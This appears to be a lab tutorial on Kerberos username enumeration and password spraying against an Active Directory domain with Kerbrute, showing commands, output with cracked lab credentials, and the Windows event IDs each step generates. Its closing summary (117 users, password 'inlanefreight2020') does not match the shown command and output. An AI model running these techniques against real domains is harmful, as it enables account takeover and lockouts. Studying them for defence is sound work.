# Account Enumeration & Password Spraying with Kerberos 


It is possible to test if a username exists or if a password is valid for an account using Kerberos. Indeed, following the first request made by a user, **AS-REQ**, the domain controller can respond differently depending on whether the username presented exists or not and, if it does, whether the password is correct or not. 


This **AS-REQ** request is how the [Kerbrute](https://github.com/ropnop/kerbrute) tool performs username enumeration and password spraying. 


Bruteforcing Windows usernames and passwords with Kerberos is very fast and potentially stealthier than other methods since pre-authentication failures do not trigger that "traditional" **An account failed to log on event 4625**. With Kerberos, you can validate a username or test a login by only sending one UDP frame to the KDC (Domain Controller).


## Kerbrute Install


To install Kerbrute, we need to download the binary from [kerbrute releases](https://github.com/ropnop/kerbrute/releases/), select the latest one for Linux kerbrute_linux_amd64, and change its privileges to be executable.



![kerbrute install](/Kerberos/Kerberos-Attacks/Acct-Enum-Password-Spray-w-Kerberos/images/kerbrute-install.png) 



## User Enumeration 



To enumerate usernames, **Kerbrute** sends TGT requests with no pre-authentication. If the KDC responds with a **PRINCIPAL UNKNOWN** error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and move on. This does not cause logon failures, so it will not lock out any accounts. This generates a Windows event ID **4768** if Kerberos logging is enabled. For this to work, we must provide the tool with a list of usernames, the domain controller's IP or hostname, and the domain. 



### User Enumeration 


In this example, we provided **Kerbrute** with a list of 209 usernames, and 1 of them was  valid. They were all checked in 1.111s, which is very fast.


	kerbrute/kerbrute2 userenum users.txt --dc dc01.inlanefreight.local -d inlanefreight.local

	    __             __               __     
	   / /_____  _____/ /_  _______  __/ /____ 
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

	Version: dev (n/a) - 01/19/24 - Ronnie Flathers @ropnop

	2024/01/19 12:47:47 >  Using KDC(s):
	2024/01/19 12:47:47 >   dc01.inlanefreight.local:88

	2024/01/19 12:47:47 >  [+] VALID USERNAME:       adam.jones@inlanefreight.local
	2024/01/19 12:47:48 >  Done! Tested 209 usernames (1 valid) in 1.111 seconds



![Kerbrute User Enum](/Kerberos/Kerberos-Attacks/Acct-Enum-Password-Spray-w-Kerberos/images/kerbrute-user-enum.png) 




## Password Spraying 


With **passwordspray, Kerbrute** will perform a horizontal brute force attack against a list of domain users. This is useful for testing one or two common passwords when you have a large list of users. This **does increment** the failed login count and can lock out accounts. This will generate **both event IDs 4768 - A Kerberos authentication ticket (TGT) was requested, and 4771 - Kerberos pre-authentication failed**. 



### Password Spraying 


kerbrute -users users-2.txt -password 'HTBRocks!' -dc-ip 10.129.205.35 -domain inlanefreight.local
Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs
                                                            
	[*] Valid user => Administrator
	[*] Blocked/Disabled user => Guest                                                                                      
	[*] Blocked/Disabled user => krbtgt
	[*] Valid user => derek.walker 
	[*] Valid user => carole.holmes
	[*] Valid user => callum.dixon 
	[*] Valid user => beth.richards
	[*] Stupendous => amber.smith:HTBRocks!
	[*] Stupendous => jenna.smith:HTBRocks!
	[*] Stupendous => carole.rose:HTBRocks!
	[*] Valid user => sqldev
	[*] Valid user => sqlprod
	[*] Valid user => sqlqa
	[*] Valid user => sql-test
	[*] Valid user => adam.jones
	[*] Valid user => jacob.kelly
	[*] Valid user => daniel.whitehead
	[*] Valid user => annette.jackson
	[*] Valid user => sandra.murphy
	[*] Valid user => debra.rogers 
	[*] Valid user => htb-student
	[*] Valid user => brian.willis
	[*] Stupendous => matilda.kens:HTBRocks!
	[*] Saved TGT in matilda.kens.ccache




In this case, we provided Kerbrute with a list of 117 usernames and the password inlanefreight2020. It was valid for four of them. 


![Password Spray](/Kerberos/Kerberos-Attacks/Acct-Enum-Password-Spray-w-Kerberos/images/password-spray.png) 


